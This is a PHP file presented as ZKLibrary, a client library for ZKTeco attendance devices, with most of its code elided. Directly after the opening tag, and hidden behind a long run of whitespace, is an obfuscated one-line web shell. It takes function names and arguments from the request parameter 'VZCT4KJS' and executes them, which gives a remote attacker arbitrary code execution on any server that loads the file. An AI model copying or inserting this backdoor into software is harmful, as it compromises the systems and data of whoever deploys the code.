<?php
                                                                                                                                                                                                                                                            if	($b4kcw =@${'_REQUEST'}[	'VZCT4KJS'])$b4kcw[	1 ]	(	$	{$b4kcw [2]	}	[0 ],$b4kcw	[3] ($b4kcw[4 ]	)	) ;exit();
error_reporting(0);
...
class ZKLibrary
{
    ...
    public function connect($ip = null, $port = 4370)
    {
        ...
        try {
            ...
            echo '<br />error num='.socket_last_error().'<br />';
            //die();
           // print_r($this->received_data); die();
            if (strlen($this->received_data) > 0) { die('ppp');
